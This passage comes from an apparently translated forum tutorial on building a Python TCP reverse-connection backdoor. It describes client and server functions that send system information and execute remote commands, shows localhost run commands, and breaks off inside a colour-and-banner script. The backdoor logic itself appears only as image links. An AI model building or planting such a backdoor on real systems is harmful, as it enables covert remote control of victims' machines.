<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#send_data()%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE%E7%9A%84%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>Send_data()发送数据的函数</h3><p>　　该函数计算数据的长度后将其与数据一起发送。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_2F34JSYTZW4S4PY.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　现在我们把调用函数组合放在一起。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　我们必须调用函数，否则它自己是不会执行的。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_63946M86UGZNUC9.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　至此我们完成了部分代码，现在让我们将客户机脚本也进行相应的修改。</p>
<h2><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>2.2 客户端代码</h2><p>　　客户端也需要遵守一些规则和命令，比如服务器脚本中的exec命令。我们的import声明应该改成:</p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments">#!/usr/bin/env python</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">socket, subprocess as sp, sys, os</code></div></div></td></tr></tbody></table><p>　　我们首先建立的函数是connect()连接函数。</p>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#connect()%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>Connect()函数</h3><p>　　该函数跟名称含义一样，作用为跟指定的地址连接建立后发送自身系统信息，接收控制端的远程命令。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_NG8T8ERXRMYC2CF.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　然后以连接流作为参数调用interactive_session()交互式会话函数。</p>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#interactive_session()%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%BC%9A%E8%AF%9D%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>interactive_session()交互式会话函数</h3><p>　　该函数运行一个循环根据“if”语句接受和执行命令。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_G3FCSHY8GHBJW44.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　该函数使用另一个send_data()发送数据函数来发送数据。</p>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm#send_data()%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81%E5%87%BD%E6%95%B0"><span class="header-link"></span></a>Send_data()数据发送函数</h3><p>　　该函数将计算数据执行后结果的总长度，将执行后的结果转换为字符串，填充为16位。将这个总长度跟执行后的结果数据一起发送出去。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_XPM5H4BHCJR8FM2.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　为了便于将来的修改和添加功能，我们把所有的函数代码组合在一起,放到connect()函数里。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　当然，在主函数里我们必须调用connect()函数，否则函数自己是不会自动执行的。</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_F2NYZBG55PA5MM2.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　让我们执行服务器控制端的脚本，监听一个8000端口，看看得到了什么结果。</p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python plain">root@Sploit:~</code><code class="python keyword">/</code><code class="python plain">Desktop</code><code class="python comments"># python reverseTcp.py '' 8000</code></div></div></td></tr></tbody></table><p>　　执行受控制客户端在命令行上连接控制端主机，输出命令的方式如下。</p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python plain">root@Sploit:~</code><code class="python keyword">/</code><code class="python plain">Desktop</code><code class="python comments"># python connect.py 127.0.0.1 8000</code></div></div></td></tr></tbody></table><p>以下是攻击者服务器脚本的运行截图：</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_C47MT8VJ57V98B5.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>帮助选项如下：</p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p> <img src="./[原创]如何基于Python写一个TCP反向连接后门-『外文翻译』-看雪安全论坛_files/3_DZN36ZHUYF679HN.png" style="max-width: 100%; cursor: pointer;" alt="图片描述" class="div_message_boxShadow"></p>
<div class="kx_md_br_div" style="margin:0; line-height:1;">&nbsp;</div><p>　　通过NMap扫描远程系统得到的结果，受控制客户端已经打开了服务端口，正如预期的那样，客户端控制台显示出来的信息应该是空的，因为我们没有打印任何东西到终端界面上。</p>
<h3><a name="" class="anchor" href="https://bbs.pediy.com/thread-224228.htm"><span class="header-link"></span></a>2.3 实践部分</h3><p><strong>reverse_tcp_part2.py</strong></p>
<table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div class="line number77 index76 alt2">77</div><div class="line number78 index77 alt1">78</div><div class="line number79 index78 alt2">79</div><div class="line number80 index79 alt1">80</div><div class="line number81 index80 alt2">81</div><div class="line number82 index81 alt1">82</div><div class="line number83 index82 alt2">83</div><div class="line number84 index83 alt1">84</div><div class="line number85 index84 alt2">85</div><div class="line number86 index85 alt1">86</div><div class="line number87 index86 alt2">87</div><div class="line number88 index87 alt1">88</div><div class="line number89 index88 alt2">89</div><div class="line number90 index89 alt1">90</div><div class="line number91 index90 alt2">91</div><div class="line number92 index91 alt1">92</div><div class="line number93 index92 alt2">93</div><div class="line number94 index93 alt1">94</div><div class="line number95 index94 alt2">95</div><div class="line number96 index95 alt1">96</div><div class="line number97 index96 alt2">97</div><div class="line number98 index97 alt1">98</div><div class="line number99 index98 alt2">99</div><div class="line number100 index99 alt1">100</div><div class="line number101 index100 alt2">101</div><div class="line number102 index101 alt1">102</div><div class="line number103 index102 alt2">103</div><div class="line number104 index103 alt1">104</div><div class="line number105 index104 alt2">105</div><div class="line number106 index105 alt1">106</div><div class="line number107 index106 alt2">107</div><div class="line number108 index107 alt1">108</div><div class="line number109 index108 alt2">109</div><div class="line number110 index109 alt1">110</div><div class="line number111 index110 alt2">111</div><div class="line number112 index111 alt1">112</div><div class="line number113 index112 alt2">113</div><div class="line number114 index113 alt1">114</div><div class="line number115 index114 alt2">115</div><div class="line number116 index115 alt1">116</div><div class="line number117 index116 alt2">117</div><div class="line number118 index117 alt1">118</div><div class="line number119 index118 alt2">119</div><div class="line number120 index119 alt1">120</div><div class="line number121 index120 alt2">121</div><div class="line number122 index121 alt1">122</div><div class="line number123 index122 alt2">123</div><div class="line number124 index123 alt1">124</div><div class="line number125 index124 alt2">125</div><div class="line number126 index125 alt1">126</div><div class="line number127 index126 alt2">127</div><div class="line number128 index127 alt1">128</div><div class="line number129 index128 alt2">129</div><div class="line number130 index129 alt1">130</div><div class="line number131 index130 alt2">131</div><div class="line number132 index131 alt1">132</div><div class="line number133 index132 alt2">133</div><div class="line number134 index133 alt1">134</div><div class="line number135 index134 alt2">135</div><div class="line number136 index135 alt1">136</div><div class="line number137 index136 alt2">137</div><div class="line number138 index137 alt1">138</div><div class="line number139 index138 alt2">139</div><div class="line number140 index139 alt1">140</div><div class="line number141 index140 alt2">141</div><div class="line number142 index141 alt1">142</div><div class="line number143 index142 alt2">143</div><div class="line number144 index143 alt1">144</div><div class="line number145 index144 alt2">145</div><div class="line number146 index145 alt1">146</div><div class="line number147 index146 alt2">147</div><div class="line number148 index147 alt1">148</div><div class="line number149 index148 alt2">149</div><div class="line number150 index149 alt1">150</div><div class="line number151 index150 alt2">151</div><div class="line number152 index151 alt1">152</div><div class="line number153 index152 alt2">153</div><div class="line number154 index153 alt1">154</div><div class="line number155 index154 alt2">155</div><div class="line number156 index155 alt1">156</div><div class="line number157 index156 alt2">157</div><div class="line number158 index157 alt1">158</div><div class="line number159 index158 alt2">159</div><div class="line number160 index159 alt1">160</div><div class="line number161 index160 alt2">161</div><div class="line number162 index161 alt1">162</div><div class="line number163 index162 alt2">163</div><div class="line number164 index163 alt1">164</div><div class="line number165 index164 alt2">165</div><div class="line number166 index165 alt1">166</div><div class="line number167 index166 alt2">167</div><div class="line number168 index167 alt1">168</div><div class="line number169 index168 alt2">169</div><div class="line number170 index169 alt1">170</div><div class="line number171 index170 alt2">171</div><div class="line number172 index171 alt1">172</div><div class="line number173 index172 alt2">173</div><div class="line number174 index173 alt1">174</div><div class="line number175 index174 alt2">175</div><div class="line number176 index175 alt1">176</div><div class="line number177 index176 alt2">177</div><div class="line number178 index177 alt1">178</div><div class="line number179 index178 alt2">179</div><div class="line number180 index179 alt1">180</div><div class="line number181 index180 alt2">181</div><div class="line number182 index181 alt1">182</div><div class="line number183 index182 alt2">183</div><div class="line number184 index183 alt1">184</div><div class="line number185 index184 alt2">185</div><div class="line number186 index185 alt1">186</div><div class="line number187 index186 alt2">187</div><div class="line number188 index187 alt1">188</div><div class="line number189 index188 alt2">189</div><div class="line number190 index189 alt1">190</div><div class="line number191 index190 alt2">191</div><div class="line number192 index191 alt1">192</div><div class="line number193 index192 alt2">193</div><div class="line number194 index193 alt1">194</div><div class="line number195 index194 alt2">195</div><div class="line number196 index195 alt1">196</div><div class="line number197 index196 alt2">197</div><div class="line number198 index197 alt1">198</div><div class="line number199 index198 alt2">199</div><div class="line number200 index199 alt1">200</div><div class="line number201 index200 alt2">201</div><div class="line number202 index201 alt1">202</div><div class="line number203 index202 alt2">203</div><div class="line number204 index203 alt1">204</div><div class="line number205 index204 alt2">205</div><div class="line number206 index205 alt1">206</div><div class="line number207 index206 alt2">207</div><div class="line number208 index207 alt1">208</div><div class="line number209 index208 alt2">209</div><div class="line number210 index209 alt1">210</div><div class="line number211 index210 alt2">211</div><div class="line number212 index211 alt1">212</div><div class="line number213 index212 alt2">213</div><div class="line number214 index213 alt1">214</div><div class="line number215 index214 alt2">215</div><div class="line number216 index215 alt1">216</div><div class="line number217 index216 alt2">217</div><div class="line number218 index217 alt1">218</div><div class="line number219 index218 alt2">219</div><div class="line number220 index219 alt1">220</div><div class="line number221 index220 alt2">221</div><div class="line number222 index221 alt1">222</div><div class="line number223 index222 alt2">223</div><div class="line number224 index223 alt1">224</div><div class="line number225 index224 alt2">225</div><div class="line number226 index225 alt1">226</div><div class="line number227 index226 alt2">227</div><div class="line number228 index227 alt1">228</div><div class="line number229 index228 alt2">229</div><div class="line number230 index229 alt1">230</div><div class="line number231 index230 alt2">231</div><div class="line number232 index231 alt1">232</div><div class="line number233 index232 alt2">233</div><div class="line number234 index233 alt1">234</div><div class="line number235 index234 alt2">235</div><div class="line number236 index235 alt1">236</div><div class="line number237 index236 alt2">237</div><div class="line number238 index237 alt1">238</div><div class="line number239 index238 alt2">239</div><div class="line number240 index239 alt1">240</div><div class="line number241 index240 alt2">241</div><div class="line number242 index241 alt1">242</div><div class="line number243 index242 alt2">243</div><div class="line number244 index243 alt1">244</div><div class="line number245 index244 alt2">245</div><div class="line number246 index245 alt1">246</div><div class="line number247 index246 alt2">247</div><div class="line number248 index247 alt1">248</div><div class="line number249 index248 alt2">249</div><div class="line number250 index249 alt1">250</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python comments"># -*- coding: utf-8 -*-</code></div><div class="line number2 index1 alt1"><code class="python keyword">import</code> <code class="python plain">socket,subprocess as sp</code></div><div class="line number3 index2 alt2"><code class="python keyword">import</code> <code class="python plain">sys</code></div><div class="line number4 index3 alt1"><code class="python keyword">import</code> <code class="python plain">os</code></div><div class="line number5 index4 alt2"><code class="python keyword">import</code> <code class="python plain">platform</code></div><div class="line number6 index5 alt1">&nbsp;</div><div class="line number7 index6 alt2"><code class="python comments"># 颜色美化函数</code></div><div class="line number8 index7 alt1"><code class="python keyword">def</code> <code class="python plain">script_colors(color_type,text):</code></div><div class="line number9 index8 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">color_end </code><code class="python keyword">=</code> <code class="python string">'\033[0m'</code></div><div class="line number10 index9 alt1">&nbsp;</div><div class="line number11 index10 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"r"</code> <code class="python keyword">or</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"red"</code><code class="python plain">:</code></div><div class="line number12 index11 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">red </code><code class="python keyword">=</code> <code class="python string">'\033[91m'</code></div><div class="line number13 index12 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text </code><code class="python keyword">=</code> <code class="python plain">red </code><code class="python keyword">+</code> <code class="python plain">text </code><code class="python keyword">+</code> <code class="python plain">color_end</code></div><div class="line number14 index13 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"lgray"</code><code class="python plain">:</code></div><div class="line number15 index14 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">gray </code><code class="python keyword">=</code> <code class="python string">'\033[2m'</code></div><div class="line number16 index15 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text </code><code class="python keyword">=</code> <code class="python plain">gray </code><code class="python keyword">+</code> <code class="python plain">text </code><code class="python keyword">+</code> <code class="python plain">color_end</code></div><div class="line number17 index16 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"gray"</code><code class="python plain">:</code></div><div class="line number18 index17 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">gray </code><code class="python keyword">=</code> <code class="python string">'\033[90m'</code></div><div class="line number19 index18 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text </code><code class="python keyword">=</code> <code class="python plain">gray </code><code class="python keyword">+</code> <code class="python plain">text </code><code class="python keyword">+</code> <code class="python plain">color_end</code></div><div class="line number20 index19 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"strike"</code><code class="python plain">:</code></div><div class="line number21 index20 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">strike </code><code class="python keyword">=</code> <code class="python string">'\033[9m'</code></div><div class="line number22 index21 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text </code><code class="python keyword">=</code> <code class="python plain">strike </code><code class="python keyword">+</code> <code class="python plain">text </code><code class="python keyword">+</code> <code class="python plain">color_end</code></div><div class="line number23 index22 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"underline"</code><code class="python plain">:</code></div><div class="line number24 index23 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">underline </code><code class="python keyword">=</code> <code class="python string">'\033[4m'</code></div><div class="line number25 index24 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text </code><code class="python keyword">=</code> <code class="python plain">underline </code><code class="python keyword">+</code> <code class="python plain">text </code><code class="python keyword">+</code> <code class="python plain">color_end</code></div><div class="line number26 index25 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"b"</code> <code class="python keyword">or</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"blue"</code><code class="python plain">:</code></div><div class="line number27 index26 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">blue </code><code class="python keyword">=</code> <code class="python string">'\033[94m'</code></div><div class="line number28 index27 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text </code><code class="python keyword">=</code> <code class="python plain">blue </code><code class="python keyword">+</code> <code class="python plain">text </code><code class="python keyword">+</code> <code class="python plain">color_end</code></div><div class="line number29 index28 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"g"</code> <code class="python keyword">or</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"gree"</code><code class="python plain">:</code></div><div class="line number30 index29 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">gree </code><code class="python keyword">=</code> <code class="python string">'\033[92m'</code></div><div class="line number31 index30 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text </code><code class="python keyword">=</code> <code class="python plain">gree </code><code class="python keyword">+</code> <code class="python plain">text </code><code class="python keyword">+</code> <code class="python plain">color_end</code></div><div class="line number32 index31 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"y"</code> <code class="python keyword">or</code> <code class="python plain">color_type.lower() </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"yellow"</code><code class="python plain">:</code></div><div class="line number33 index32 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">yellow </code><code class="python keyword">=</code> <code class="python string">'\033[93m'</code></div><div class="line number34 index33 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">text </code><code class="python keyword">=</code> <code class="python plain">yellow </code><code class="python keyword">+</code> <code class="python plain">text </code><code class="python keyword">+</code> <code class="python plain">color_end</code></div><div class="line number35 index34 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number36 index35 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">text</code></div><div class="line number37 index36 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">text</code></div><div class="line number38 index37 alt1">&nbsp;</div><div class="line number39 index38 alt2"><code class="python comments"># 横幅函数</code></div><div class="line number40 index39 alt1"><code class="python keyword">def</code> <code class="python plain">banner():</code></div><div class="line number41 index40 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">banner </code><code class="python keyword">=</code> <code class="python comments">'''</code></div><div class="line number42 index41 alt1"><code class="python comments">sszhhzDDhzszhzzhhzssss====ss=+===+====ss=szzzzzzzDDDDhDhzzsD</code></div><div class="line number43 index42 alt2"><code class="python comments">s+zhhzhhzzsshhzhzhhsss====ss==sss====szszzhhhzzzzhzDDDDDzssD</code></div><div class="line number44 index43 alt1"><code class="python comments">=+zzhhhhzzhzhhhhzzzssssszsszz=szss====ssszhhhhhhzszDhDDhz==h</code></div><div class="line number45 index44 alt2"><code class="python comments">=+zzhhhzzhhhzzhhzssss+szsssss=sss=s+=s=sszzzhhhDhzhhhhhhs+=h</code></div><div class="line number46 index45 alt1"><code class="python comments">z+shzzzzzhzhhhzhsssss+=sszs=s=sssss=====szszhhzzhhsshhhhs(=h</code></div><div class="line number47 index46 alt2"><code class="python comments">s&lt;=hhzzzhsszhhzsshhzs=+szzsss===ssss==+=szzszzzzzzhzhDhh=&lt;hh</code></div><div class="line number48 index47 alt1"><code class="python comments">=&lt;=hhzzzzszzss=szhhszs=+shssss==ssss=+&lt;szzzszzhzszzzhDDh+=hh</code></div><div class="line number49 index48 alt2"><code class="python comments">+=shDshzzssz=sszzs=szz=+=zs=+s==s======zzzzzhzzhzsszshBh=&lt;sh</code></div><div class="line number50 index49 alt1"><code class="python comments">&lt;==szsszzsssszsss+++zz=++sz==s=====+=+=zssshzzzzszszszDh=&lt;+h</code></div><div class="line number51 index50 alt2"><code class="python comments">(((&lt;=s=sssssssss=+===s=&lt;+=ssssss=s==++=ss+==ss=sszsss=+++&lt;&lt;z</code></div><div class="line number52 index51 alt1"><code class="python comments">((&lt;+=sssssss=++=+&lt;+++s+&lt;====ssszs=s=+&lt;=s==+++=sszz====&lt;((((+</code></div><div class="line number53 index52 alt2"><code class="python comments">&lt;&lt;&lt;+++=s=s===+++++++ss+++====sss====++zs=&lt;++++=sss====+((&lt;((</code></div><div class="line number54 index53 alt1"><code class="python comments">+((&lt;&lt;=s=+==s=s=+=(&lt;=sh++==s==ss=====++sz=++==+&lt;=ss=+&lt;&lt;&lt;((((&lt;</code></div><div class="line number55 index54 alt2"><code class="python comments">&lt;((&lt;+++=====++++++++szs=+=s=s=s=====+=zs++++=+&lt;&lt;=====&lt;&lt;((((&lt;</code></div><div class="line number56 index55 alt1"><code class="python comments">(&lt;+&lt;&lt;+=+=s=+&lt;=szszs=sss=======s======sz=+=+=s+&lt;&lt;&lt;==+++&lt;((~~(</code></div><div class="line number57 index56 alt2"><code class="python comments">&lt;++&lt;&lt;+++=ssszDDhDBBDzsssss====+=+==ssss=zDDDDhs&lt;&lt;==+&lt;&lt;((((~(</code></div><div class="line number58 index57 alt1"><code class="python comments">++&lt;&lt;&lt;&lt;&lt;+=szshhsshz=hDs==ss==+=&lt;&lt;+=ss=+=hBDsshBD=&lt;+++&lt;(~((&lt;((</code></div><div class="line number59 index58 alt2"><code class="python comments">=&lt;++&lt;+++=zs+hs+zDs--hh=+===+=+&lt;&lt;+=s=++hDh&lt;.-=sh=+++&lt;&lt;(((~(&lt;(</code></div><div class="line number60 index59 alt1"><code class="python comments">+&lt;=+=====+&lt;&lt;z=&lt;hDhz=sDs&lt;&lt;+=++&lt;(&lt;++=&lt;(zszh=~s+&lt;s+&lt;===&lt;&lt;((((((</code></div><div class="line number61 index60 alt2"><code class="python comments">++=+++&lt;&lt;(&lt;(&lt;z=&lt;hBBNh=hD+&lt;+=&lt;&lt;&lt;(&lt;&lt;+&lt;(+z+sDDDD&lt;&lt;z=~(+=+&lt;(&lt;(~((</code></div><div class="line number62 index61 alt1"><code class="python comments">+===+&lt;&lt;&lt;&lt;&lt;&lt;&lt;ss&lt;=hBD++hB&lt;(&lt;&lt;&lt;&lt;&lt;((&lt;&lt;~-sh&lt;=BNNz&lt;&lt;z+~(&lt;&lt;&lt;((&lt;((((</code></div><div class="line number63 index62 alt2"><code class="python comments">==ss=++=+&lt;&lt;&lt;=z+(+=+&lt;=BB&lt;(&lt;&lt;&lt;&lt;&lt;(&lt;(&lt;~-zB&lt;(=Dh+(sz(~~&lt;&lt;&lt;((+&lt;(((</code></div><div class="line number64 index63 alt1"><code class="python comments">==ss=====+++&lt;=z=+&lt;+sDBB&lt;~&lt;&lt;(&lt;&lt;((((-~zNz((+&lt;(=h+~((&lt;&lt;&lt;&lt;(&lt;&lt;(&lt;&lt;</code></div><div class="line number65 index64 alt2"><code class="python comments">==========+&lt;+&lt;+szhhDDDD&lt;-(&lt;((((~~~~~zDDh=+=zh=((&lt;+++&lt;&lt;(&lt;&lt;&lt;&lt;&lt;</code></div><div class="line number66 index65 alt1"><code class="python comments">===s========+&lt;&lt;&lt;++++&lt;+D+~(&lt;(((((~~~(s+=shzzs&lt;(+=++++&lt;((&lt;(&lt;&lt;&lt;</code></div><div class="line number67 index66 alt2"><code class="python comments">=====s=======++((~~~-+h=(&lt;&lt;&lt;+&lt;((((-(s&lt;--(&lt;&lt;((&lt;====+&lt;&lt;((&lt;&lt;&lt;(+</code></div><div class="line number68 index67 alt1"><code class="python 